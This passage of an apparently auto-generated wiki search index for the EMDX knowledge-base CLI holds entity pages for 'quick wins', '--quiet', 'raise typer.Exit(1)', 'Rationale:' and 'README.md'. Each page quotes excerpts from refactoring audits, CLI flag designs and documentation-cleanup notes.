\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.4)</li> <li><code>npm init -y</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.4)</li> <li><code>npm init</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.4)</li> <li><code>minimum viable init</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.4)</li> <li><code>getting started</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.4)</li> <li><code>dropped python</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.4)</li> </ul>"},{"location":"entities/quick-wins/","title":"quick wins","text":"<p>Type: concept | Mentioned in: 14 documents | First seen: 2026-01-10</p>"},{"location":"entities/quick-wins/#documents-14","title":"Documents (14)","text":"<ul> <li>#6470 Comprehensive Any/None Typing Audit Report for EMDX   Section: 1. emdx/commands/ (11 files audited) <p>Quick Wins:</p> </li> <li><code>cascade._process_stage()</code>: Use existing <code>DocumentRow</code></li> <li><code>groups._add_group_to_tree()</code>: Use existing <code>DocumentGroup</code></li> <li> <p><code>recipe._find_recipe()</code>: Use existing <code>DocumentRow</code></p> </li> <li> <p>#6435 Any/None typing audit [3/5]   Section: Estimated Effort</p> <ul> <li>Quick wins: 3 functions (existing TypedDicts) ~15 min</li> </ul> </li> <li>New TypedDicts: 15-20 new definitions ~2-3 hours</li> <li> <p>Total replaceable: 24 out of 29 Any usages</p> </li> <li> <p>#6598 Delegate synthesis [synthesis]   Section: Implementation Roadmap</p> </li> <li>[ ] Fix <code>emdx stats</code> None crash</li> <li>[ ] Suppress migration output (or batch to single line)</li> <li> <p>[ ] Add \"Next:\" hints to empty states (<code>list</code>, <code>find</code>, <code>recent</code>)</p> </li> <li> <p>#6536 EMDX Future Directions: Agent-First Design [synthesis]   Section: Unified Roadmap</p> </li> <li> <p>#6508 Any Type Removal Analysis [synthesis]   Section: Priority Implementation Order</p> </li> <li>Replace all <code>**kwargs: Any</code> with <code>**kwargs: object</code> in <code>__init__</code> methods</li> <li>Replace SQL param <code>list[Any]</code> with <code>list[str | int]</code> in ask_service.py</li> <li> <p>Type lazy-loaded services with <code>TYPE_CHECKING</code> guards</p> </li> <li> <p>#6335 Architecture Refactoring Assessment - February 2026</p> <p>Current State: 51 total occurrences across 6 files. Pattern:</p> </li> </ul> <pre><code>conditions = [\"is_deleted = FALSE\", \"archived_at IS NULL\"]\n</code></pre> <p>Recommendation: Define constant:</p> <pre><code># database/constants.py\nACTIVE_DOC_FILTER = \"is_deleted = FALSE ...\n\n- **#6329** Delegate: Analyze emdx/utils/ and emdx/config/ for architecture improv [5/10]\n  &gt; **Solution**: Move to `services/execution/`:\n</code></pre> <p>emdx/services/execution/ \u251c\u2500\u2500 init.py \u251c\u2500\u2500 wrapper.py        # renamed from claude_wrapper.py \u251c\u2500\u2500 log_parser.py     # renamed from output_parser.py \u2514\u2500\u2500 logger.py         # renamed from structured_log...</p> <ul> <li>#6328 Delegate: Analyze emdx/ui/ for architecture improvements. Focus on: (1 [3/10] </li> </ul>"},{"location":"entities/quick-wins/#phase-1-quick-wins-1-day","title":"Phase 1: Quick Wins (1 day)","text":""},{"location":"entities/quick-wins/#phase-1-quick-wins-weeks-1-2","title":"Phase 1: Quick Wins (Weeks 1-2)","text":"Feature Source Effort <code>emdx next</code> Task 1 Low <code>--retry N</code> flag Task 3 Low <code>--budget $X</code> flag Tas..."},{"location":"entities/quick-wins/#phase-1-quick-wins-1-2-hours","title":"Phase 1: Quick Wins (1-2 hours)","text":""},{"location":"entities/quick-wins/#5-quick-wins-low-effort-high-impact","title":"5. Quick Wins (Low Effort, High Impact)","text":"<ol> <li>Create <code>emdx/ui/mixins/</code> directory with:</li> <li><code>cursor_navigation.py</code> - j/k/g/G bindings</li> <li><code>screen_switching.py</code> - 1/2/3/4 actions</li> <li><code>status_bar.py</code> - update_status pattern</li> </ol> <p>2.</p> <ul> <li>#6324 Delegate: Architecture Improvement Analysis v0.14.0 [9/10] <p>```</p> </li> </ul>"},{"location":"entities/quick-wins/#212-cli-executor-base-class-enhancement-low-priority","title":"2.12 CLI Executor Base Class Enhancement (Low Priority)","text":"<p>Current State: <code>cli_executor/base.py</code> has abstract methods</p> <p>Recommendation: Add common validation/parsing methods to reduce duplication</p>"},{"location":"entities/quick-wins/#3-quick-wins-can-be-done-imme","title":"3. Quick Wins (Can Be Done Imme...","text":"<ul> <li>#6309 Delegate: Analyze FUNCTION COMPLEXITY across emdx/ (exclude ui/ and tests/) <p><code>merge_similar()</code> has duplicated dry-run vs actual merge logic. Recommendation: </p> </li> <li>Separate wizard UI from maintenance operations</li> <li>Extract <code>_determine_keep_document(doc1, doc2)</code> helper to deduplicate keep/remove logic</li> </ul>"},{"location":"entities/quick-wins/#quick-wins-high-i","title":"Quick Wins (High I...","text":"<ul> <li>#6308 Delegate: Analyze API SURFACE &amp; CONCISENESS across emdx/ (exclude ui/  [10/15]   Section: Recommended Simplifications </li> <li>Remove <code>emdx recipe create</code> (shell for <code>save --tags recipe</code>)</li> <li>Remove <code>emdx exec logs</code> and <code>emdx exec tail</code> (use <code>show -f</code>)</li> <li> <p>Remove <code>--auto-tag</code> and `--suggest...</p> </li> <li> <p>#6237 Delegate synthesis [synthesis]   Section: Recommended Action Plan</p> </li> <li>Run <code>ruff check --fix</code> to eliminate ~1,100 auto-fixable issues</li> <li>Remove <code>python-dotenv</code> and other unused dependencies</li> <li>Update <code>ruff</code> to ^0.14.0</li> <li> <p>Rem...</p> </li> <li> <p>#6235 Delegate: tech-debt,audit,comprehensive [12/14]   Section: Recommended Action Plan</p> </li> <li>Run <code>ruff check --fix</code> to auto-fix ~1000 issues</li> <li>Fix test coverage configuration</li> <li>Address undefined <code>FileWatcher</code> references</li> <li> <p>Remove duplicate dictionary key</p> </li> <li> <p>#3073 Tech Debt Epic &amp; Task Breakdown   Section: Design Principles for Agent Parallelization</p> <p>...Dependencies between epics: Later epics depend on earlier ones completing</p> </li> <li>Quick wins first: High-value, low-risk tasks upfront for momentum</li> <li>Atomic PRs: Each task = 1 PR for easy review/merge</li> </ul>"},{"location":"entities/quick-wins/#priority-1-quick-wins","title":"Priority 1 - Quick Wins","text":""},{"location":"entities/quick-wins/#phase-2-quick-wins-1-week","title":"Phase 2: Quick Wins (1 week)","text":""},{"location":"entities/quick-wins/#phase-1-quick-wins-1-2-days","title":"Phase 1: Quick Wins (1-2 days)","text":""},{"location":"entities/quick-wins/#related-entities","title":"Related Entities","text":"<ul> <li><code>executive summary analyzed</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.9)</li> <li><code>total lines</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.3)</li> <li><code>ruff check --fix</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.3)</li> <li><code>get_db_path()</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.3)</li> <li><code>execute_cli_sync()</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.3)</li> <li><code>utils/text_formatting.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=4.9)</li> <li><code>solution:</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=4.9)</li> <li><code>recommended action plan</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=4.9)</li> <li><code>output.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=4.9)</li> <li><code>estimated total effort</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=4.9)</li> </ul>"},{"location":"entities/quiet/","title":"--quiet","text":"<p>Type: tech_term | Mentioned in: 14 documents | First seen: 2026-02-14</p>"},{"location":"entities/quiet/#documents-14","title":"Documents (14)","text":"<ul> <li> <p>#6825 Delegate: --help [2/2]   Section: Options</p> <p>...sonnet<code>) | |</code>--opus<code>| \u2014 | \u2014 | Use Opus model (shortcut for</code>--model opus<code>) | |</code>--quiet<code>|</code>-q<code>| \u2014 | Suppress metadata on stderr (just content on stdout) | |</code>--doc<code>|</code>-d<code>| INTEGER | Document ID to use as input context | |</code>--pr` | \u2014 | \u2014 | Instruct a...</p> </li> <li> <p>#6811 Delegate: Fix DOC-7: Update docs/cli-api.md to add the --json flag to  [2/5]   Section: Summary</p> <ol> <li>Added <code>--json</code> to the Options Reference table (line 935) with description: \"Structured JSON output (implies <code>--quiet</code>)\"</li> </ol> </li> <li> <p>#6670 Prime Command Redesign Research [synthesis]   Section: Actionable Items</p> <p>...ction** for delegates: \"Do NOT check ready tasks or pick up other work\"</p> </li> <li>Drop <code>--quiet</code> flag logic \u2014 it becomes unnecessary since the hook handles the branching</li> <li> <p>Consider Aider's repo map approach for future enhancement \u2014 PageRank-weighted symb...</p> </li> <li> <p>#6661 Prime Command Redesign Research [2/3]   Section: Current state</p> <p>The hook runs <code>emdx prime --quiet</code> for all sessions (human and delegate alike). There's no detection of whether the session is a sub-agent or a human. But the human interactive session (top of th...</p> </li> <li> <p>#6660 Prime Command Redesign Research [3/3]   Section: Summary: What Changes</p> <p>...man: chrome (<code>===</code>) | Shown | Dropped | | Delegate: prime output | Same as human (<code>--quiet</code>) \u2014 shows ALL ready tasks | 3 lines, no tasks | | Delegate: \"check ready tasks\" | Implicitly included via CLAUDE.md | Explicitly contradicted: \"Do NOT\" | | Detec...</p> </li> <li> <p>#6564 Delegate: Analyze the emdx delegate command implementation in emdx/com [1/3]   Section: Core Task Options</p> <p>...| Title for output document(s) | | <code>--model</code> | <code>-m</code> | Override default model | | <code>--quiet</code> | <code>-q</code> | Suppress metadata on stderr (just content on stdout) | | <code>--doc</code> | <code>-d</code> | Document ID to use as input context for all tasks |</p> </li> <li> <p>#6560 Delegate: Recent Failures in emdx prime   Section: <code>emdx/commands/prime.py</code></p> <p>...hars)</p> </li> <li>Shows retry command: <code>Retry: emdx delegate --retry &lt;id&gt;</code></li> <li> <p>Respects <code>--quiet</code> flag (hidden in quiet mode)</p> </li> <li> <p>#6546 Delegate Enhancement Gameplans [synthesis]   Section: Key Findings by Feature</p> <p>Options: <code>--hours N</code>, <code>--dry-run</code>, <code>--json</code>, <code>--quiet</code></p> </li> <li> <p>#6447 Implement emdx distill command   Section: Summary</p> <p>...for me|docs|coworkers`</p> </li> <li>Save to KB: <code>--save --title \"Title\"</code></li> <li> <p>Quiet mode: <code>--quiet</code></p> </li> <li> <p>#6446 Implement emdx distill command   Section: Files Created/Modified</p> <p>...me/docs/coworkers/team)</p> </li> <li><code>--save</code> flag to persist distilled output to KB</li> <li><code>--quiet</code> mode for machine-readable output</li> <li> <p><code>--limit</code> to control number of source documents</p> </li> <li> <p>#6398 Delegate synthesis [synthesis]   Section: 2. The Dual-Interface Architecture Solution</p> <ul> <li>Explicit flags beat auto-detection: <code>--json</code>, <code>--quiet</code>, <code>--porcelain</code></li> </ul> </li> <li>Sensible defaults based on context: TTY detection, environment variables</li> <li> <p>One code path, multiple outputs: Same logic, different rendering...</p> </li> <li> <p>#6397 Delegate: Design a concrete 'dual-interface' architecture for EMDX whe [2/3]   Section: Recommended Output Modes</p> <p>...inal use | | <code>--json</code> | Full structured output | Agent consumption, scripting | | <code>--quiet</code> / <code>-q</code> | Minimal output (just IDs) | Piping to next command | | <code>--porcelain</code> | Stable machine-parseable text | Scripts needing stability guarantees |</p> </li> <li> <p>#6395 Delegate: Analyze how EMDX is used differently by humans vs AI agents. [1/3]   Section: Agent Patterns</p> <p>Output Preference:</p> </li> <li><code>--json</code> for structured parsing</li> <li><code>--ids-only</code> for piping</li> <li><code>--no-pager --raw</code> for content extraction</li> <li> <p><code>--quiet</code> mode for minimal metadata</p> </li> <li> <p>#6314 Delegate: analysis,architecture,active [13/15]   Section: Core Architecture Layers</p> <p>...*: <code>emdx tag 42 active</code> \u2192 <code>emdx tag add 42 active</code></p> </li> <li>Global options: <code>--verbose</code>, <code>--quiet</code>, <code>--db-url</code>, <code>--safe-mode</code></li> </ul>"},{"location":"entities/quiet/#related-entities","title":"Related Entities","text":"<ul> <li><code>wraps claude</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.9)</li> <li><code>stability promises</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.9)</li> <li><code>outputmode</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.9)</li> <li><code>detect_output_mode()</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.9)</li> <li><code>agent interaction patterns</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.9)</li> <li><code>3 lines</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.9)</li> <li><code>prime.sh</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.5)</li> <li><code>emdx_doc_id</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.5)</li> <li><code>humans are the default</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.3)</li> <li><code>explicit beats implicit</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.3)</li> </ul>"},{"location":"entities/raise-typerexit1/","title":"raise typer.exit(1)","text":"<p>Type: tech_term | Mentioned in: 9 documents | First seen: 2026-02-14</p>"},{"location":"entities/raise-typerexit1/#documents-9","title":"Documents (9)","text":"<ul> <li> <p>#6519 Delegate: Analyze FEAT-7: Re-implement ask-kb improvements (PR #453).  [2/2]   Section: What's Obsolete / Changed Since PR #453</p> <ol> <li><code>from None</code> syntax \u2014 Current code uses <code>raise typer.Exit(1) from None</code> consistently; PR used bare <code>raise typer.Exit(1)</code>. Should use <code>from None</code> per codebase conventions.</li> </ol> </li> <li> <p>#6382 Codebase Bug Audit 2026-02-15 [synthesis]   Section: 1. Inconsistent Exception Chaining</p> <p>Most files properly use <code>from err</code> or <code>from None</code>, but cascade.py and some CLI commands have bare <code>raise typer.Exit(1)</code> without context.</p> </li> <li> <p>#6374 Codebase Bug Audit 2026-02-15 [2/10]   Section: Low Severity Bugs</p> <p>...\u2014 raise Exit without exception chaining File: ask.py Line: 95 Issue: <code>raise typer.Exit(1) from None</code> is used but the context is \"No relevant documents found\" which isn't an error condition that needs suppression. Using <code>from None</code> unnecessarily. **Impact:...</p> </li> <li> <p>#6324 Delegate: Architecture Improvement Analysis v0.14.0 [9/10]   Section: 2.6 Inconsistent Error Handling (Low Priority)</p> <p>Current State: Mixed patterns in commands:</p> </li> <li><code>commands/core.py</code>: try/except with <code>raise typer.Exit(1)</code></li> <li> <p><code>commands/delegate.py</code>: <code>_safe_*</code> wrappers that never fail</p> </li> <li> <p>#6323 Delegate: Analyze emdx/commands/ for architecture improvements. Focus  [1/10]   Section: 1. Code Duplication</p> <p>...er) if not doc:     console.print(f\"[red]Error: Document ... not found[/red]\")     raise typer.Exit(1) ``` Found in:</p> </li> <li><code>core.py</code>: lines 584-588, 657-661</li> <li><code>tags.py</code>: lines 44-48, 156-159</li> <li><code>gist.py</code>: lines 197-200</li> <li> <p><code>groups.py</code>: lines 97-100</p> </li> <li> <p>#6313 Delegate: Analyze BOILERPLATE &amp; REPEATED PATTERNS across emdx/ (exclud [9/15]   Section: 2. CLI Error Handling Pattern (103+ occurrences)</p> <p>Pattern: <code>raise typer.Exit(1)</code> with <code>console.print([red]error[/red])</code></p> </li> <li> <p>#6307 Delegate: Analyze ERROR HANDLING PATTERNS across emdx/ (exclude ui/ an [6/15]   Section: \u2705 Positive Patterns</p> <ol> <li>Proper CLI Error Propagation - Commands consistently use <code>raise typer.Exit(1)</code> with chained exceptions (<code>from e</code>) for proper error context preservation.</li> </ol> </li> <li> <p>#6293 Delegate: DEBT-14: Fix ruff violations - 1071 fixes applied   Section: Manually Fixed (38 fixes)</p> <p>Exception Chaining (B904 - 22 fixes):</p> </li> <li>Added <code>from None</code> to all <code>raise typer.Exit(1)</code> statements in except blocks</li> <li> <p>Files: ask.py, delegate.py, groups.py, cli_executor/factory.py, embedding_service.py</p> </li> <li> <p>#6226 Delegate: Audit API/INTERFACE DEBT in the emdx CLI: Check all CLI comm [3/14]   Section: CRITICAL SEVERITY (Breaking Contract Risks)</p> <p>...sistent Exit Codes Location: Throughout commands Issue: Some commands use <code>raise typer.Exit(1)</code> for errors, others return silently.</p> </li> <li><code>trash.py:restore()</code> - Returns silently if nothing to restore</li> <li><code>cascade.py:show()</code> - Returns silently if no docs at stage</li> <li>`...</li> </ul>"},{"location":"entities/raise-typerexit1/#related-entities","title":"Related Entities","text":"<ul> <li><code>error handling pattern</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.6)</li> <li><code>raise typer.exit(1) from none</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.0)</li> <li><code>missing input validation</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.0)</li> <li><code>from none</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=5.6)</li> <li><code>silent failures</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.2)</li> <li><code>utils/datetime_utils.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.0)</li> <li><code>from e</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.0)</li> <li><code>find()</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=4.6)</li> <li><code>commands/</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=4.2)</li> <li><code>database/</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=4.1)</li> </ul>"},{"location":"entities/rationale/","title":"rationale:","text":"<p>Type: concept | Mentioned in: 9 documents | First seen: 2026-02-15</p>"},{"location":"entities/rationale/#documents-9","title":"Documents (9)","text":"<ul> <li> <p>#6848 Delegate: ARCH-14: Add click as an explicit dependency in pyproject.to [3/4]   Section: Summary</p> <p>Rationale: Typer 0.23.1 (from PyPI metadata) requires <code>click&gt;=8.0.0</code>, not <code>&gt;=8.1.0</code>. The comment also referenced the outdated Typer 0.15.</p> </li> <li> <p>#6696 Delegate: Research noise filtering strategies for entity-based documen [1/4]   Section: Strategy 1: Heading-Specific Blocklist (Immediate, High Impact)</p> <p>Rationale: Headings are the worst noise source because markdown convention produces the same generic section names across nearly all documents. Wikipedia's Manual of Style ex...</p> </li> <li> <p>#6690 Delegate: Research UX patterns for surfacing multi-method document lin [4/4]   Section: Recommendation 5: Better Save Feedback</p> <p>Rationale: The user doesn't need to know link creation details at save time. The important signal is \"this doc connected to your knowledge graph.\" The entity count is useful...</p> </li> <li> <p>#6609 Delegate: Investigate removing the emoji alias system from emdx. The s [1/2]   Section: Recommendation: Big Bang removal (with migration)</p> <p>Rationale:</p> </li> <li>The alias system is a pure indirection layer \u2014 it adds complexity without meaningful functionality now that we want text tags</li> <li> <p>It touches only 9 source files,...</p> </li> <li> <p>#6533 EMDX Future Directions: Agent-First Design [1/4]   Section: Feature Ideas</p> <p>...emdx session end \"Implemented auth refactor, blocked on DB schema migration\" ``` Rationale: Explicit session boundaries let the system track what was worked on and create resumable context for the next session.</p> </li> <li> <p>#6491 Any Type Removal Analysis [1/5]   Section: 1. Line 51: <code>load_children</code> method parameter</p> <p>Rationale: The <code>doc_db</code> parameter is the document service module (<code>emdx.services.document_service</code>). Since it's imported conditionally and may be <code>None</code>, the type should refl...</p> </li> <li> <p>#6487 Any Type Removal Analysis [3/5]   Section: 1. Line 51: <code>PaletteResultWidget.__init__</code> kwargs</p> <p>Rationale: The kwargs are passed directly to <code>ListItem.__init__()</code>. Using <code>object</code> is acceptable when you're just forwarding kwargs and don't need strict typing. <code>Unpack</code> with a TypedDict is more precise but may be overkill.</p> </li> <li> <p>#6410 Delegate: Research and design structured metadata for emdx save and de [2/2]   Section: Implementation Approach: JSON Metadata Column</p> <p>Rationale:</p> </li> <li>Single <code>metadata</code> TEXT column storing JSON (like SQLite's JSON1 extension)</li> <li>Extensible without schema migrations</li> <li> <p>Query via JSON functions: `json_extract(metad...</p> </li> <li> <p>#6367 Gameplan: emdx compact \u2014 AI-Powered KB Synthesis   Section: 1. Always Use Opus for Synthesis</p> <p>Rationale: Synthesis requires understanding context across multiple documents and producing coherent, well-organized output. This is a quality-critical task where Opus excels...</p> </li> </ul>"},{"location":"entities/rationale/#related-entities","title":"Related Entities","text":"<ul> <li><code>recommended:</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.0)</li> <li><code>name</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.2)</li> <li><code>implementation:</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.0)</li> <li><code>current:</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.0)</li> <li><code>object</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=4.6)</li> <li><code>implementation plan</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=4.1)</li> <li><code>document_tags</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=4.1)</li> <li><code>any type removal analysis</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=4.0)</li> <li><code>emdx find</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=2.7)</li> <li><code>tags</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=2.6)</li> </ul>"},{"location":"entities/readmemd/","title":"readme.md","text":"<p>Type: heading | Mentioned in: 9 documents | First seen: 2025-07-07</p>"},{"location":"entities/readmemd/#documents-9","title":"Documents (9)","text":"<ul> <li>#6614 Delegate: Update documentation to remove all references to emoji alias   Section: Changes Made </li> <li>Changed \"Tags use plain text that maps to emoji under the hood\" to \"Tags are plain text strings for flexible classification\"</li> <li> <p>Simplified tag table: removed \"Means\" column with emoji, kept just \"Tag\" and \"Use for\"</p> </li> <li> <p>#6608 Delegate: Remove the --each/--do dynamic discovery feature from emdx d   Section: Changes Made</p> </li> <li>Removed the \"Dynamic discovery\" section entirely (lines ~103-114)</li> <li> <p>Removed the \"Process items dynamically\" row from the quick reference table</p> </li> <li> <p>#6718 Wiki Generation Architecture Research   Section: 1. Markdown Collection \u2192 Wiki (Static Site Generators)</p> <p>...\u2014 <code>sidebar_position</code>, <code>title</code>, <code>order</code> in YAML front matter</p> </li> <li>Index files \u2014 <code>README.md</code> or <code>index.md</code> as category landing pages</li> <li> <p>Sort conventions \u2014 Alphabetical, numerical prefix (01-intro.md), or explicit ordering files</p> </li> <li> <p>#1 SQLite Migration Plan for emdx   Section: 4. Migration Strategy</p> </li> <li><code>database.py</code> - Complete rewrite for SQLite</li> <li><code>pyproject.toml</code> - Remove psycopg dependency</li> <li><code>README.md</code> - Update installation (simpler!)</li> <li> <p>Add <code>migrate.py</code> - Optional migration tool</p> </li> <li> <p>#11 Claude Code Agents Plugin Mode Analysis &amp; Gameplan   Section: Phase 3: Documentation Cleanup (Next 15 minutes)</p> </li> <li><code>README.md</code></li> <li><code>README-NEW-STRUCTURE.md</code></li> <li> <p><code>KNOWLEDGE-BASE-GUIDE.md</code></p> </li> <li> <p>#6458 Delegate: Say hello and list 3 files in the current directory. Be brie   Section: 3 Files in Current Directory</p> <ol> <li>README.md - Project documentation</li> </ol> </li> <li>pyproject.toml - Python project configuration</li> <li> <p>justfile - Task runner commands</p> </li> <li> <p>#6298 Delegate: DEBT-31: Add missing Architecture Decision Records (ADRs)   Section: DEBT-31: Add Missing Architecture Decision Records (ADRs)</p> <p>README.md - Index and template for future ADRs</p> </li> <li> <p>#414 emdx Cleanup Analysis - Dead Code and Old Plans   Section: 1. Markdown Files for Removal</p> <p>Files to keep:</p> </li> <li>README.md - Essential project documentation</li> <li>CHANGELOG.md - Important version history</li> </ul>"},{"location":"entities/readmemd/#readmemd_1","title":"README.md","text":""},{"location":"entities/readmemd/#readmemd_2","title":"README.md","text":""},{"location":"entities/readmemd/#files-to-modify","title":"Files to modify:","text":""},{"location":"entities/readmemd/#31-consolidate-readme-files","title":"3.1 Consolidate README Files","text":"<p>Currently have multiple README files with conflicting info:</p>"},{"location":"entities/readmemd/#related-entities","title":"Related Entities","text":"<ul> <li><code>no python</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.6)</li> <li><code>emdx tag add</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.6)</li> <li><code>test_emoji_aliases.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.6)</li> <li><code>summary removed</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.3)</li> <li><code>docs/testing.md</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.2)</li> <li><code>claude.md</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=5.0)</li> <li><code>ruff check .</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=4.8)</li> <li><code>docs/cli-api.md</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=4.6)</li> <li><code>emoji_aliases.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=4.6)</li> <li><code>docs/architecture.md</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=4.4)</li> 